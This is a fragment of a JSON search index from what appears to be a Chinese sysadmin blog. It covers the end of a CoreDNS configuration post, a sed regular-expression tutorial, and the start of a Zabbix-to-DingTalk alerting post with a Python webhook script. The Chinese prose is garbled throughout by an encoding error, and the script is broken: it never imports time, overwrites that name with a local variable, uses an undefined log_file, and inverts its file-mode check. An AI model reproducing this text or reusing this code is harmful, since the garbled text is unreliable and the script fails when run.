class=\"o\"\u003e[\u003c/span\u003eInstall\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eWantedBy\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003emulti-user.target\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eä¸œè¥¿å…¨éƒ½åœ¨/usr/local/bin/coredns.confé…ç½®æ–‡ä»¶é‡Œï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e.:5353 https://.:443 \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  any\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  log\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  debug\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"nb\"\u003ebind\u003c/span\u003e 172.18.30.1\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  tls /usr/local/bin/full.pem /usr/local/bin/key.pem\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  hosts /etc/hosts \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    ttl \u003cspan class=\"m\"\u003e60\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    reload 1m\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    no_reverse\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    fallthrough\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  cache \u003cspan class=\"m\"\u003e120\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  reload 6s\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  loadbalance\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  forward . 114.114.114.114:53 223.5.5.5:53 223.6.6.6:53 \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      policy sequential\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  prometheus 172.18.30.1:9253\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eè§£é‡Šä¸€ä¸‹ï¼š\u003c/p\u003e","title":"CoreDNSæ›¿ä»£dnsmasq"},{"content":"ä¹‹å‰è¯´è¿‡sedçš„é«˜é˜¶ç”¨æ³•ï¼Œå…¶å®æ™®é€šæƒ…å†µä¸‹ï¼Œæ­£åˆ™æ˜¯æœ€å¸¸ç”¨çš„ï¼Œä¸‹é¢å°±æ¥è¯´ä¸€ä¸‹ï¼Œç”¨ä¸åˆ°çš„å°±æš‚æ—¶ä¸è¯´\n^ # åŒ¹é…è¡Œå¼€å§‹ï¼Œå¦‚ï¼š/^sed/åŒ¹é…æ‰€æœ‰ä»¥sedå¼€å¤´çš„è¡Œã€‚ $ # åŒ¹é…è¡Œç»“æŸï¼Œå¦‚ï¼š/sed$/åŒ¹é…æ‰€æœ‰ä»¥sedç»“å°¾çš„è¡Œã€‚ . # åŒ¹é…ä¸€ä¸ªéæ¢è¡Œç¬¦çš„ä»»æ„å­—ç¬¦ï¼Œå¦‚ï¼š/s.d/åŒ¹é…såæ¥ä¸€ä¸ªä»»æ„å­—ç¬¦ï¼Œæœ€åæ˜¯dã€‚ * # åŒ¹é…0ä¸ªæˆ–å¤šæ¬¡å­—ç¬¦ï¼Œå¦‚ï¼š/a*sed/åŒ¹é…æ‰€æœ‰æ¨¡æ¿æ˜¯0ä¸ªæˆ–å¤šä¸ªaåç´§è·Ÿsedçš„è¡Œã€‚åç´§è·Ÿsedçš„è¡Œã€‚ \\? # åŒ¹é…0æ¬¡æˆ–1æ¬¡ä»–å‰é¢çš„å­—ç¬¦ \\+ # åŒ¹é…1æ¬¡æˆ–å¤šæ¬¡ä»–å‰é¢çš„å­—ç¬¦ï¼Œå¦‚ï¼šç©ºæ ¼\\+ æˆ– â€œ\\+â€œåŒ¹é…è‡³å°‘ä¸€ä¸ªæˆ–å¤šä¸ªç©ºæ ¼ | #ç®¡é“ç¬¦å·ç”¨æ¥åŒ¹é…ä¸¤è¾¹ä»»æ„ä¸€ä¸ªå­è¡¨è¾¾å¼ï¼Œå¦‚ï¼š\u0026#39;/101\\|102/p\u0026#39; åŒ¹é…åŒ…å«101æˆ–è€…102çš„è¡Œæ‰“å° [] # åŒ¹é…ä¸€ä¸ªæŒ‡å®šèŒƒå›´å†…çš„å­—ç¬¦ï¼Œå¦‚/[sS]ed/åŒ¹é…sedå’ŒSedã€‚ [^] # åŒ¹é…ä¸€ä¸ªä¸åœ¨æŒ‡å®šèŒƒå›´å†…çš„å­—ç¬¦ï¼Œå¦‚ï¼š/[^A-RT-Z]ed/åŒ¹é…ä¸åŒ…å«A-Rå’ŒT-Zçš„ä¸€ä¸ªå­—æ¯å¼€å¤´ï¼Œç´§è·Ÿedçš„è¡Œã€‚ \\(..\\) # åŒ¹é…å­ä¸²ï¼Œä¿å­˜åŒ¹é…çš„å­—ç¬¦ï¼Œå¦‚s/\\(love\\)able/\\1rsï¼Œloveableè¢«æ›¿æ¢æˆloversã€‚ \u0026amp; # ä¿å­˜æœç´¢å­—ç¬¦ç”¨æ¥æ›¿æ¢å…¶ä»–å­—ç¬¦ï¼Œå¦‚s/love/ **\u0026amp;** /ï¼Œloveè¿™æˆ **love** ã€‚ \\\u0026lt; # åŒ¹é…å•è¯çš„å¼€å§‹ï¼Œå¦‚:/\\\u0026lt;love/åŒ¹é…åŒ…å«ä»¥loveå¼€å¤´çš„å•è¯çš„è¡Œã€‚ \\\u0026gt; # åŒ¹é…å•è¯çš„ç»“æŸï¼Œå¦‚/love\\\u0026gt;/åŒ¹é…åŒ…å«ä»¥loveç»“å°¾çš„å•è¯çš„è¡Œã€‚ \\{m\\} # é‡å¤å­—ç¬¦xï¼Œmæ¬¡ï¼Œå¦‚ï¼š/0\\{5\\}/åŒ¹é…åŒ…å«5ä¸ª0çš„è¡Œã€‚ \\{m,\\} # é‡å¤å­—ç¬¦xï¼Œè‡³å°‘mæ¬¡ï¼Œå¦‚ï¼š/0\\{5,\\}/åŒ¹é…è‡³å°‘æœ‰5ä¸ª0çš„è¡Œã€‚ \\{m,n\\} # é‡å¤å­—ç¬¦xï¼Œè‡³å°‘mæ¬¡ï¼Œä¸å¤šäºnæ¬¡ï¼Œå¦‚ï¼š/0\\{5,10\\}/åŒ¹é…5~10ä¸ª0çš„è¡Œã€‚ ä¾‹å­å¾ˆå¤š:\nç”¨æˆ·åï¼Œåé¢è·Ÿ1ä¸ªæˆ–è€…å¤šä¸ªç©ºæ ¼ï¼Œå†è·Ÿå¯†ç ï¼›æ›´æ¢æˆç”¨æˆ·å å¯†ç  MACåœ°å€\nsed -i \u0026#34;s/${username} \\+${password}$/${username} ${password} ${IV_HWADDR}/\u0026#34; ${PASSFILE} è·Ÿ shell è„šæœ¬çš„å‚æ•°ä¸€èµ·è®°æ¯”è¾ƒå¥½ï¼š\n$0 è„šæœ¬æœ¬èº«çš„åå­— $1 ä¼ é€’ç»™è¯¥shellè„šæœ¬çš„ç¬¬1ä¸ªå‚æ•° $2 ä¼ é€’ç»™è¯¥shellè„šæœ¬çš„ç¬¬2ä¸ªå‚æ•° $@ ä¼ ç»™è„šæœ¬çš„æ‰€æœ‰å‚æ•°çš„åˆ—è¡¨ $# ä¼ ç»™è„šæœ¬çš„å‚æ•°ä¸ªæ•° $* ä»¥ä¸€ä¸ªå•å­—ç¬¦ä¸²æ˜¾ç¤ºæ‰€æœ‰å‘è„šæœ¬ä¼ é€’çš„å‚æ•°ï¼Œä¸ä½ç½®å˜é‡ä¸åŒï¼Œ\u0026gt;å‚æ•°å¯è¶…è¿‡9ä¸ª $$ è„šæœ¬è¿è¡Œçš„å½“å‰è¿›ç¨‹IDå· $? å‘½ä»¤æ‰§è¡Œç»“æœåé¦ˆï¼Œ0è¡¨ç¤ºæ‰§è¡ŒæˆåŠŸï¼Œå…¶ä½™æ•°å­—è¡¨ç¤ºæ‰§è¡Œä¸æˆåŠŸã€‚ è¿˜æœ‰ä¸€ä¸ªé‡è¦çš„åœ°æ–¹ï¼Œsed ä½¿ç”¨ -i å¯¹æ–‡ä»¶è¿›è¡Œä¿®æ”¹æ—¶ï¼Œæ‰§è¡Œè€…éœ€è¦æœ‰å¯¹æ–‡ä»¶ç›®å½•çš„å†™æƒé™ï¼Œå› ä¸ºsedå®é™…æ˜¯äº§ç”Ÿäº†ä¸€ä¸ªä¸´æ—¶æ–‡ä»¶ï¼Œç„¶åå†æŒªå›å»å¾—ï¼ï¼ï¼ï¼\n","permalink":"https://rendoumi.com/posts/20221207-sed_regex/","summary":"\u003cp\u003eä¹‹å‰è¯´è¿‡sedçš„é«˜é˜¶ç”¨æ³•ï¼Œå…¶å®æ™®é€šæƒ…å†µä¸‹ï¼Œæ­£åˆ™æ˜¯æœ€å¸¸ç”¨çš„ï¼Œä¸‹é¢å°±æ¥è¯´ä¸€ä¸‹ï¼Œç”¨ä¸åˆ°çš„å°±æš‚æ—¶ä¸è¯´\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e^ \u003cspan class=\"c1\"\u003e# åŒ¹é…è¡Œå¼€å§‹ï¼Œå¦‚ï¼š/^sed/åŒ¹é…æ‰€æœ‰ä»¥sedå¼€å¤´çš„è¡Œã€‚\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ \u003cspan class=\"c1\"\u003e# åŒ¹é…è¡Œç»“æŸï¼Œå¦‚ï¼š/sed$/åŒ¹é…æ‰€æœ‰ä»¥sedç»“å°¾çš„è¡Œã€‚\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e. \u003cspan class=\"c1\"\u003e# åŒ¹é…ä¸€ä¸ªéæ¢è¡Œç¬¦çš„ä»»æ„å­—ç¬¦ï¼Œå¦‚ï¼š/s.d/åŒ¹é…såæ¥ä¸€ä¸ªä»»æ„å­—ç¬¦ï¼Œæœ€åæ˜¯dã€‚\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e* \u003cspan class=\"c1\"\u003e# åŒ¹é…0ä¸ªæˆ–å¤šæ¬¡å­—ç¬¦ï¼Œå¦‚ï¼š/a*sed/åŒ¹é…æ‰€æœ‰æ¨¡æ¿æ˜¯0ä¸ªæˆ–å¤šä¸ªaåç´§è·Ÿsedçš„è¡Œã€‚åç´§è·Ÿsedçš„è¡Œã€‚\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\\?\u003c/span\u003e \u003cspan class=\"c1\"\u003e# åŒ¹é…0æ¬¡æˆ–1æ¬¡ä»–å‰é¢çš„å­—ç¬¦\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\\+\u003c/span\u003e \u003cspan class=\"c1\"\u003e# åŒ¹é…1æ¬¡æˆ–å¤šæ¬¡ä»–å‰é¢çš„å­—ç¬¦ï¼Œå¦‚ï¼šç©ºæ ¼\\+ æˆ– â€œ\\+â€œåŒ¹é…è‡³å°‘ä¸€ä¸ªæˆ–å¤šä¸ªç©ºæ ¼\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e \u003cspan class=\"c1\"\u003e#ç®¡é“ç¬¦å·ç”¨æ¥åŒ¹é…ä¸¤è¾¹ä»»æ„ä¸€ä¸ªå­è¡¨è¾¾å¼ï¼Œå¦‚ï¼š\u0026#39;/101\\|102/p\u0026#39; åŒ¹é…åŒ…å«101æˆ–è€…102çš„è¡Œæ‰“å°\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[]\u003c/span\u003e \u003cspan class=\"c1\"\u003e# åŒ¹é…ä¸€ä¸ªæŒ‡å®šèŒƒå›´å†…çš„å­—ç¬¦ï¼Œå¦‚/[sS]ed/åŒ¹é…sedå’ŒSedã€‚  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e^\u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"c1\"\u003e# åŒ¹é…ä¸€ä¸ªä¸åœ¨æŒ‡å®šèŒƒå›´å†…çš„å­—ç¬¦ï¼Œå¦‚ï¼š/[^A-RT-Z]ed/åŒ¹é…ä¸åŒ…å«A-Rå’ŒT-Zçš„ä¸€ä¸ªå­—æ¯å¼€å¤´ï¼Œç´§è·Ÿedçš„è¡Œã€‚\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\\(\u003c/span\u003e..\u003cspan class=\"se\"\u003e\\)\u003c/span\u003e \u003cspan class=\"c1\"\u003e# åŒ¹é…å­ä¸²ï¼Œä¿å­˜åŒ¹é…çš„å­—ç¬¦ï¼Œå¦‚s/\\(love\\)able/\\1rsï¼Œloveableè¢«æ›¿æ¢æˆloversã€‚\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e \u003cspan class=\"c1\"\u003e# ä¿å­˜æœç´¢å­—ç¬¦ç”¨æ¥æ›¿æ¢å…¶ä»–å­—ç¬¦ï¼Œå¦‚s/love/ **\u0026amp;** /ï¼Œloveè¿™æˆ **love** ã€‚\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\\\u0026lt;\u003c/span\u003e \u003cspan class=\"c1\"\u003e# åŒ¹é…å•è¯çš„å¼€å§‹ï¼Œå¦‚:/\\\u0026lt;love/åŒ¹é…åŒ…å«ä»¥loveå¼€å¤´çš„å•è¯çš„è¡Œã€‚\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\\\u0026gt;\u003c/span\u003e \u003cspan class=\"c1\"\u003e# åŒ¹é…å•è¯çš„ç»“æŸï¼Œå¦‚/love\\\u0026gt;/åŒ¹é…åŒ…å«ä»¥loveç»“å°¾çš„å•è¯çš„è¡Œã€‚\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\\{\u003c/span\u003em\u003cspan class=\"se\"\u003e\\}\u003c/span\u003e \u003cspan class=\"c1\"\u003e# é‡å¤å­—ç¬¦xï¼Œmæ¬¡ï¼Œå¦‚ï¼š/0\\{5\\}/åŒ¹é…åŒ…å«5ä¸ª0çš„è¡Œã€‚\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\\{\u003c/span\u003em,\u003cspan class=\"se\"\u003e\\}\u003c/span\u003e \u003cspan class=\"c1\"\u003e# é‡å¤å­—ç¬¦xï¼Œè‡³å°‘mæ¬¡ï¼Œå¦‚ï¼š/0\\{5,\\}/åŒ¹é…è‡³å°‘æœ‰5ä¸ª0çš„è¡Œã€‚\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\\{\u003c/span\u003em,n\u003cspan class=\"se\"\u003e\\}\u003c/span\u003e \u003cspan class=\"c1\"\u003e# é‡å¤å­—ç¬¦xï¼Œè‡³å°‘mæ¬¡ï¼Œä¸å¤šäºnæ¬¡ï¼Œå¦‚ï¼š/0\\{5,10\\}/åŒ¹é…5~10ä¸ª0çš„è¡Œã€‚  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eä¾‹å­å¾ˆå¤š:\u003c/p\u003e\n\u003cp\u003eç”¨æˆ·åï¼Œåé¢è·Ÿ1ä¸ªæˆ–è€…å¤šä¸ªç©ºæ ¼ï¼Œå†è·Ÿå¯†ç ï¼›æ›´æ¢æˆç”¨æˆ·å å¯†ç  MACåœ°å€\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esed -i \u003cspan class=\"s2\"\u003e\u0026#34;s/\u003c/span\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eusername\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e \\+\u003c/span\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003epassword\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e$\u003cspan class=\"s2\"\u003e/\u003c/span\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eusername\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e \u003c/span\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003epassword\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e \u003c/span\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eIV_HWADDR\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e/\u0026#34;\u003c/span\u003e \u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003ePASSFILE\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eè·Ÿ shell è„šæœ¬çš„å‚æ•°ä¸€èµ·è®°æ¯”è¾ƒå¥½ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$0\u003c/span\u003e è„šæœ¬æœ¬èº«çš„åå­—\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$1\u003c/span\u003e ä¼ é€’ç»™è¯¥shellè„šæœ¬çš„ç¬¬1ä¸ªå‚æ•°\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$2\u003c/span\u003e ä¼ é€’ç»™è¯¥shellè„šæœ¬çš„ç¬¬2ä¸ªå‚æ•°\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$@\u003c/span\u003e ä¼ ç»™è„šæœ¬çš„æ‰€æœ‰å‚æ•°çš„åˆ—è¡¨\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$#\u003c/span\u003e ä¼ ç»™è„šæœ¬çš„å‚æ•°ä¸ªæ•°\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$*\u003c/span\u003e ä»¥ä¸€ä¸ªå•å­—ç¬¦ä¸²æ˜¾ç¤ºæ‰€æœ‰å‘è„šæœ¬ä¼ é€’çš„å‚æ•°ï¼Œä¸ä½ç½®å˜é‡ä¸åŒï¼Œ\u0026gt;å‚æ•°å¯è¶…è¿‡9ä¸ª\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$$\u003c/span\u003e è„šæœ¬è¿è¡Œçš„å½“å‰è¿›ç¨‹IDå·\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$?\u003c/span\u003e å‘½ä»¤æ‰§è¡Œç»“æœåé¦ˆï¼Œ0è¡¨ç¤ºæ‰§è¡ŒæˆåŠŸï¼Œå…¶ä½™æ•°å­—è¡¨ç¤ºæ‰§è¡Œä¸æˆåŠŸã€‚\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eè¿˜æœ‰ä¸€ä¸ªé‡è¦çš„åœ°æ–¹ï¼Œsed ä½¿ç”¨ -i å¯¹æ–‡ä»¶è¿›è¡Œä¿®æ”¹æ—¶ï¼Œæ‰§è¡Œè€…éœ€è¦æœ‰å¯¹æ–‡ä»¶ç›®å½•çš„å†™æƒé™ï¼Œå› ä¸ºsedå®é™…æ˜¯äº§ç”Ÿäº†ä¸€ä¸ªä¸´æ—¶æ–‡ä»¶ï¼Œç„¶åå†æŒªå›å»å¾—ï¼ï¼ï¼ï¼\u003c/p\u003e","title":"sedä¸­çš„æ­£åˆ™è¡¨è¾¾å¼ç”¨æ³•"},{"content":"zabbix æ˜¯å¾ˆç†Ÿæ‚‰çš„ä¸œè¥¿ï¼Œä½†æ˜¯å®é™…ä¸Šåšä¸»å·²ç»è·³è¿‡äº†è¿™ä¸ªä¸œè¥¿ï¼Œç›´æ¥è¹¦åˆ° Prometheus å»äº†\nä½†æ˜¯ï¼Œå­˜åœ¨å³åˆç†ï¼Œå½“ä¸‹å…¬å¸ç”¨çš„æ˜¯è¿™ä¸ªï¼Œé‚£ä¹ˆç”¨å°±ç”¨å§ï¼Œzabbixå‘åˆ°é’‰é’‰å‘Šè­¦ã€‚\né‚£ä¹ˆæˆ‘ä»¬ä¹Ÿç ”ç©¶ä¸€ä¸‹å¦‚ä½•å‘åˆ°é’‰é’‰å‘Šè­¦ï¼Œè€Œä¸”å¥½çœ‹ä¸€äº›\nåŸç†ï¼š\nåŸç†å°±æ˜¯ç”¨ post å‘é’‰é’‰æœºå™¨äººçš„ webhook åœ°å€æäº¤ Markdown çš„ json ä¿¡æ¯\né¦–å…ˆæˆ‘ä»¬è¦å»ºç«‹ä¸ªé’‰é’‰ç¾¤ï¼Œç„¶ååœ¨ç¾¤ä¸­æ·»åŠ ä¸€ä¸ªç¾¤æœºå™¨äººï¼Œè¿™é‡Œå°±ä¼šæœ‰ä¸¤ä¸ªé€‰æ‹©ï¼Œä¸€ä¸ªæ˜¯è¿™ä¸ªæœºå™¨äººåªæ¥å—ç‰¹å®šçš„è¯è¯­ï¼ŒäºŒæ˜¯å‘æœºå™¨äººå‘é€æ¶ˆæ¯çš„æœºå™¨çš„ipæ˜¯å›ºå®šçš„ã€‚\né˜¿é‡Œäº‘å»ºè®®çš„æ˜¯å…³é”®è¯ï¼šäº‘ç›‘æ§ã€äº‘æœåŠ¡ã€ç›‘æ§ã€Monitorã€ECSã€æŠ¥è­¦\nå½“ç„¶ï¼Œè¿™é‡Œæ›´åŠ å»ºè®®IPï¼ŒIPæ˜¯æ­»çš„ï¼ŒæŠ¥è­¦é‡Œå¸¦å…³é”®è¯æ„å‘³ç€å‘é€å†…å®¹è¢«éƒ¨åˆ†å›ºå®šäº†ã€‚\nå¦‚ä¸Šï¼Œæˆ‘ä»¬ä¼šå¾—åˆ°ä¸€ä¸ªé’‰é’‰æœºå™¨äººçš„Webhookåœ°å€ï¼š\nhttps://oapi.dingtalk.com/robot/send?access_token=xxxxxxxxxx ç„¶åæˆ‘ä»¬è¦å‡†å¤‡ä¸€ä¸ªå‘é€çš„è„šæœ¬ï¼Œpythonå¾ˆåˆé€‚\n#!/usr/bin/env python #coding:utf-8 #zabbixé’‰é’‰æŠ¥è­¦ import requests,json,sys,os,datetime #è¯´æ˜ï¼šè¿™é‡Œæ”¹ä¸ºè‡ªå·±åˆ›å»ºçš„æœºå™¨äººçš„webhook webhook=\u0026#34;https://oapi.dingtalk.com/robot/send?access_token=xxxxxx\u0026#34; def log(info): if os.path.isfile(\u0026#34;/tmp/dingding.log\u0026#34;) == False: f = open(log_file, \u0026#39;a+\u0026#39;) else: f = open(log_file,\u0026#39;w+\u0026#39;) f.write(info) f.close() def msg(text,user): json_text= { \u0026#34;msgtype\u0026#34;: \u0026#34;markdown\u0026#34;, \u0026#34;markdown\u0026#34;: { \u0026#34;title\u0026#34;: \u0026#34;zabbix monitor\u0026#34;, \u0026#34;text\u0026#34;: text }, \u0026#34;at\u0026#34;: { \u0026#34;atMobiles\u0026#34;: [ user ], \u0026#34;isAtAll\u0026#34;: False } } headers = {\u0026#39;Content-Type\u0026#39;: \u0026#39;application/json\u0026#39;} r=requests.post(url=webhook,data=json.dumps(json_text),headers=headers).json() code = r[\u0026#34;errcode\u0026#34;] time=time.strftime(\u0026#34;%Y-%m-%d %H:%M:%S\u0026#34;, time.localtime()) if code == 0: log(time + \u0026#34;:æ¶ˆæ¯å‘é€æˆåŠŸ è¿”å›ç :\u0026#34; + str(code) + \u0026#34;\\n\u0026#34;) else: log(time + \u0026#34;:æ¶ˆæ¯å‘é€å¤±è´¥ è¿”å›ç :\u0026#34; + str(code) + \u0026#34;\\n\u0026#34;) exit(3) if __name__ == \u0026#39;__main__\u0026#39;: user = sys.argv[1] #ç”¨æˆ· subject = sys.argv[2] #æ ‡é¢˜ text = sys.argv[3] #æ¶ˆæ¯ msg(text,user) æˆ‘ä»¬æŠŠä¸Šé¢çš„æ–‡ä»¶å†…å®¹æ”¾åˆ° /usr/lib/zabbix/alertscripts ç›®å½•ä¸‹ï¼Œåå­—å°±å«åš dingding.py ï¼Œåªèƒ½æ˜¯è¿™ä¸ªç›®å½•ï¼Œå› ä¸ºè¿™æ˜¯ zabbix ç¼ºçœå¤–æŒ‚è„šæœ¬æ–‡ä»¶çš„ç›®å½•ã€‚\nä»ä¸Šé¢ä»£ç é‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œå®é™…æ˜¯å‘é€äº†ä¸€ä¸ª markdown çš„æ–‡æœ¬ï¼Œé‚£ä¹ˆè‡ªç„¶ï¼Œå„ç§markdownçš„è¯­æ³•å°±å¯ä»¥ç”¨èµ·æ¥äº†ï¼Œä»”ç»†çœ‹ä¸€ä¸‹é’‰é’‰markdownå‚æ•°çš„è¯¦è§£ï¼š\nå¯ä»¥æ 